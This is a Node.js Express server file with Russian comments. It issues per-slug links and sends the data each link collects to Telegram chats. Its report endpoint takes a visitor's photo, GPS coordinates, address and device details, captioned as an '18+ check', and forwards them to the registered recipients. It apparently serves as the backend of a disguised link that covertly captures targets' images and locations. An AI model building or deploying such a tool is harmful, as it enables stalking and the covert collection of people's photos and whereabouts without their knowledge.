// === server/index.js (финальная версия) ===
import 'dotenv/config';
import express from 'express';
import path from 'path';
import fs from 'fs';
import Database from 'better-sqlite3';
import { fileURLToPath } from 'url';

// ==== ENV ====
const BOT_TOKEN        = process.env.TELEGRAM_BOT_TOKEN || '';
const DEFAULT_CHAT_ID  = process.env.TELEGRAM_CHAT_ID || '';
const STATIC_ORIGIN    = process.env.STATIC_ORIGIN || '*';
const PUBLIC_BASE      = (process.env.PUBLIC_BASE || STATIC_ORIGIN).replace(/\/+$/, '');
const ADMIN_API_SECRET = process.env.ADMIN_API_SECRET || '';
const DB_PATH          = process.env.DB_PATH || './data/links.db';

// ==== Paths / Static ====
const __filename = fileURLToPath(import.meta.url);
const __dirname  = path.dirname(__filename);

// ✅ У тебя папка называется public
const PUBLIC_DIR = path.join(__dirname, 'public');

// ==== App ====
const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// --- CORS
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', STATIC_ORIGIN);
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS, GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// --- Cache headers for static files
app.use((req, res, next) => {
  if (/\.(js|css|png|jpg|jpeg|gif|svg|ico|woff2?)$/i.test(req.path)) {
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable');
  }
  next();
});

// --- Serve static
app.use(express.static(PUBLIC_DIR));

// Root → index.html
app.get('/', (_req, res) => res.sendFile(path.join(PUBLIC_DIR, 'index.html')));

// ==== DB init ====
if (!fs.existsSync(path.dirname(DB_PATH))) {
  fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
}
const db = new Database(DB_PATH);

// --- Tables
db.prepare(`
  CREATE TABLE IF NOT EXISTS links (
    slug       TEXT PRIMARY KEY,
    chat_id    TEXT NOT NULL,
    owner_id   TEXT,
    created_at INTEGER NOT NULL,
    disabled   INTEGER DEFAULT 0
  );
`).run();

db.prepare(`
  CREATE TABLE IF NOT EXISTS link_recipients (
    slug      TEXT NOT NULL,
    chat_id   TEXT NOT NULL,
    added_at  INTEGER NOT NULL,
    PRIMARY KEY (slug, chat_id),
    FOREIGN KEY (slug) REFERENCES links(slug)
  );
`).run();

// --- Apply migrate.sql automatically
try {
  const migratePath = path.join(__dirname, 'migrate.sql');
  if (fs.existsSync(migratePath)) {
    console.log('[migrate] applying migrate.sql...');
    db.exec(fs.readFileSync(migratePath, 'utf8'));
  }
} catch (e) {
  console.error('[migrate] failed', e);
}

// ==== Helpers ====
function requireAdminSecret(req, res, next) {
  const auth = req.headers['authorization'] || '';
  if (!ADMIN_API_SECRET || auth !== `Bearer ${ADMIN_API_SECRET}`) {
    return res.status(401).json({ ok: false, error: 'Unauthorized' });
  }
  next();
}

function escapeHTML(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function b64ToBuffer(dataUrl = '') {
  const i = dataUrl.indexOf('base64,');
  const b64 = i >= 0 ? dataUrl.slice(i + 7) : dataUrl;
  return Buffer.from(b64, 'base64');
}

async function sendPhotoToTelegram({ chatId, caption, photoBuf, filename = 'report.jpg' }) {
  if (!BOT_TOKEN) throw new Error('Missing TELEGRAM_BOT_TOKEN');
  if (!chatId) throw new Error('Missing chat_id');
  if (!photoBuf?.length) throw new Error('Empty photo buffer');

  const form = new FormData();
  form.append('chat_id', chatId);
  form.append('caption', caption);
  form.append('parse_mode', 'HTML');
  form.append('photo', new Blob([photoBuf], { type: 'image/jpeg' }), filename);

  const url  = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const resp = await fetch(url, { method: 'POST', body: form });
  if (!resp.ok) {
    const text = await resp.text().catch(() => '');
    throw new Error(`Telegram ${resp.status}: ${text}`);
  }
  return resp.json();
}

// ==== Health ====
app.get('/health', (_req, res) => res.json({ ok: true }));

// DEBUG: список получателей по slug (требует ADMIN_API_SECRET)
app.get('/api/debug/recipients', requireAdminSecret, (req, res) => {
  const slug = String(req.query.slug || '').trim();
  if (!slug) return res.status(400).json({ ok:false, error:'no slug' });
  const list = db.prepare(
    'SELECT chat_id, added_at FROM link_recipients WHERE slug = ?'
  ).all(slug);
  res.json({ ok:true, slug, recipients:list });
});

// ==== API: register-link ====
app.post('/api/register-link', requireAdminSecret, (req, res) => {
  try {
    const { slug, chatId, ownerId } = req.body || {};
    if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
      return res.status(400).json({ ok: false, error: 'Invalid slug' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok: false, error: 'Invalid chatId' });
    }

    const now = Date.now();
    const insert = db.prepare(
      'INSERT INTO links(slug, chat_id, owner_id, created_at) VALUES(?,?,?,?)'
    );
    try {
      insert.run(slug, String(chatId), ownerId ? String(ownerId) : null, now);
      db.prepare('INSERT OR IGNORE INTO link_recipients(slug, chat_id, added_at) VALUES(?,?,?)')
        .run(slug, String(chatId), now);
    } catch {
      return res.status(409).json({ ok: false, error: 'Slug already exists' });
    }

    const url = `${PUBLIC_BASE}/r/${slug}`;
    res.json({ ok: true, slug, url });
  } catch (e) {
    console.error('[register-link] error:', e);
    res.status(500).json({ ok: false, error: 'Internal' });
  }
});

// ==== API: claim-link ====
app.post('/api/claim-link', requireAdminSecret, (req, res) => {
  try {
    const { slug, chatId } = req.body || {};
    if (!slug || !/^[a-z0-9\-]{3,40}$/i.test(slug)) {
      return res.status(400).json({ ok: false, error: 'Invalid slug' });
    }
    if (!chatId || !/^-?\d+$/.test(String(chatId))) {
      return res.status(400).json({ ok: false, error: 'Invalid chatId' });
    }

    const row = db.prepare('SELECT disabled FROM links WHERE slug = ?').get(slug);
    if (!row || row.disabled) {
      return res.status(404).json({ ok: false, error: 'Not found' });
    }

    db.prepare('INSERT OR IGNORE INTO link_recipients(slug, chat_id, added_at) VALUES(?,?,?)')
      .run(slug, String(chatId), Date.now());

    res.json({ ok: true, slug, chatId: String(chatId) });
  } catch (e) {
    console.error('[claim-link] error:', e);
    res.status(500).json({ ok: false, error: 'Internal' });
  }
});

// ==== Route: /r/:slug ====
app.get('/r/:slug', (req, res) => {
  const { slug } = req.params;
  const row = db.prepare('SELECT chat_id, disabled FROM links WHERE slug = ?').get(slug);
  if (!row || row.disabled) return res.status(404).send('Not found');

  let html = fs.readFileSync(path.join(PUBLIC_DIR, 'index.html'), 'utf8');
  const inject = `<script>window.__SLUG=${JSON.stringify(slug)};</script>`;
  html = html.replace('</body>', `${inject}\n</body>`);
  res.setHeader('Content-Type', 'text/html; charset=utf-8');
  res.send(html);
});

// ==== API: report ====
app.post('/api/report', async (req, res) => {
  try {
    const { userAgent, platform, iosVersion, isSafari, geo, address, photoBase64, note, chatId, slug } = req.body || {};
    if (!BOT_TOKEN) return res.status(500).json({ ok: false, error: 'No BOT token' });
    if (!photoBase64) return res.status(400).json({ ok: false, error: 'No photoBase64' });

    const lines = [
      '<b>Новый отчёт 18+ проверка</b>',
      `UA: <code>${escapeHTML(userAgent || '')}</code>`,
      `Platform: <code>${escapeHTML(platform || '')}</code>`,
      `iOS-like: <code>${escapeHTML(iosVersion ?? '')}</code>  Safari: <code>${escapeHTML(isSafari)}</code>`,
      geo ? `Geo: <code>${escapeHTML(`${geo.lat}, ${geo.lon} ±${geo.acc}m`)}</code>` : 'Geo: <code>нет</code>',
      address ? `Addr: <code>${escapeHTML(address)}</code>` : null,
      note ? `Note: <code>${escapeHTML(note)}</code>` : null
    ].filter(Boolean);
    const caption = lines.join('\n');
    const buf = b64ToBuffer(photoBase64);

    let targets = [];
    if (slug) {
      targets = db.prepare('SELECT chat_id FROM link_recipients WHERE slug = ?').all(String(slug)).map(r => String(r.chat_id));
    }
    if (!targets.length) {
      const single = chatId && /^-?\d+$/.test(String(chatId)) ? String(chatId) : DEFAULT_CHAT_ID;
      if (single) targets = [single];
    }
    if (!targets.length) return res.status(400).json({ ok: false, error: 'No recipients' });

    const results = [];
    for (const target of targets) {
      try {
        const tg = await sendPhotoToTelegram({ chatId: target, caption, photoBuf: buf });
        results.push({ chatId: target, ok: true, message_id: tg?.result?.message_id });
      } catch (e) {
        results.push({ chatId: target, ok: false, error: e.message || String(e) });
      }
    }
    res.json({ ok: true, sent: results });
  } catch (e) {
    console.error('[report] error:', e);
    res.status(500).json({ ok: false, error: e.message || 'Internal error' });
  }
});

// ==== 404 fallback ====
app.use((req, res) => {
  if (req.method === 'GET' && req.accepts('html')) return res.status(404).send('Not Found');
  res.status(404).json({ ok: false, error: 'Not Found' });
});

// ==== Start ====
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
  console.log(`[server] listening on :${PORT}`);
  console.log(`[server] Public dir: ${PUBLIC_DIR}`);
  console.log(`[server] CORS Allow-Origin: ${STATIC_ORIGIN}`);
});
